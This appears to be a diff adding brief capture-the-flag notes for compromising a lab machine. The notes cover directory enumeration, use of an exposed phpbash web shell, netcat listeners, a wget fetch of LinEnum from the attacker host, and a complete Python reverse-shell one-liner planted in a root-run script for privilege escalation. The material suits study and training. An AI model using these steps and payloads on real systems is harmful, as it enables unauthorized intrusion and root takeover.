@@ -1,0 +1,44 @@
+[HTTP (80/tcp)]
+--------------------------- GOBUSTER ---------------------------
+gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+|
+|_/images
+|_/uploads
+|_/php
+|_/css
+|_/dev
+|_/js
+|_/fonts
+
+On http://10.10.10.68/dev/phpbash.php I can Execute Bash Commands and I Get User
+
+
+--------------------------- REVERSE SHELL ---------------------------
+[My PC]
+1) nc -lvp 1234
+
+[Remote PC]
+1) Intercept With Burp Suite on "http://10.10.10.68/dev/phpbash.php"
+2) Run a Command and Send to Repeater
+3) Request on BoxFiles
+4) Python Reverse Shell 
+
+
+--------------------------- TTY SHELL ---------------------------
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+--------------------------- PRIVILEGE ESCALATION ---------------------------
+[My PC]
+1) cd /opt/LinEnum/
+2) python -m SimpleHTTPServer 8000
+3) nc -lvp 4444 
+
+[Remote PC]
+1) wget 10.10.14.25:8000/LinEnum.sh
+2) Run It
+3) sudo -u scriptmanager bash
+4) cd /scripts/
+5) echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
+
+Wait a minute since the test.txt is ROOT the Server will connect to 4444 as ROOT
